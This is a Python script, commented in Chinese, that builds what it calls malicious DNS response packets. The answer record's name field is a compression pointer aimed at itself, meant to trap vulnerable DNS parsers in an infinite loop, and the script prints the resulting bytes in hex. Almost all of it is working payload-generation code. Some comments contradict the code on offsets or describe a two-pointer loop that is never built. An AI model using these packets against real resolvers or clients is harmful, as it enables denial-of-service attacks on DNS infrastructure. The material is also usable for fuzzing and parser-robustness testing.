import struct
import random


def build_malicious_dns_response():
    """构造一个包含自引用压缩指针的恶意DNS响应"""

    # DNS Header (12 bytes)
    transaction_id = random.randint(0, 65535)
    flags = 0x8180  # 标准响应标志
    questions = 1
    answers = 1
    authorities = 0
    additionals = 0

    header = struct.pack(
        "!HHHHHH", transaction_id, flags, questions, answers, authorities, additionals
    )

    # DNS Question (查询部分)
    # 查询 example.com 的 A 记录
    question = b"\x07example\x03com\x00" + struct.pack("!HH", 1, 1)  # TYPE A, CLASS IN

    # 恶意 Answer 部分
    # 构造一个自引用的压缩指针
    # 格式：Name (压缩指针指向自己) + TYPE + CLASS + TTL + RDLENGTH + RDATA

    # 假设我们的 Answer 从偏移量 0x0C 开始（经过 Header 12字节 + Question）
    # 指针指向自己，即偏移量 0x0C (12)
    pointer = len(header) + len(question)  # 指向当前 Name 字段的开始
    name_ptr = 0xC000 | pointer  # 0xC000 + 0x000C = 0xC00C

    # 构造一个循环引用：指针指向自己
    # 或者更复杂的：A 指向 B，B 指向 A
    name = struct.pack("!H", name_ptr)  # 2字节压缩指针

    # 记录类型：A (1)
    rtype = 1
    rclass = 1
    ttl = 300
    rdlength = 4  # IPv4地址长度
    rdata = b"\x08\x08\x08\x08"  # 8.8.8.8

    answer = name + struct.pack("!HHIH", rtype, rclass, ttl, rdlength) + rdata

    # 组合完整响应包
    packet = header + question + answer

    return packet


def build_loop_pointer_packet():
    """构造一个更复杂的循环：指针A指向指针B，指针B指向指针A"""

    # Header
    header = struct.pack("!HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0)

    # Question (查询 example.com)
    question = b"\x07example\x03com\x00" + struct.pack("!HH", 1, 1)

    # 计算偏移量：
    # Header (12) + Question (13+4=17) = 0x1D (29)
    # 在Answer中，Name字段开始于偏移量 0x1D

    # 创建两个指针互相引用
    # 指针A指向偏移量 0x1D (当前Name位置)
    # 指针B指向偏移量 0x1F (Name+2字节)

    # 但更简单的：直接让指针指向自己
    name_offset = 0x1D  # Answer Name 开始的位置
    name = struct.pack("!H", 0xC000 | name_offset)  # 指向自己

    # Answer记录
    answer = name + struct.pack("!HHIH", 1, 1, 300, 4) + b"\x08\x08\x08\x08"

    return header + question + answer


if __name__ == "__main__":
    packet = build_malicious_dns_response()
    print("Malicious DNS Response Packet:", packet.hex())

    loop_packet = build_loop_pointer_packet()
    print("Loop Pointer DNS Packet:", loop_packet.hex())
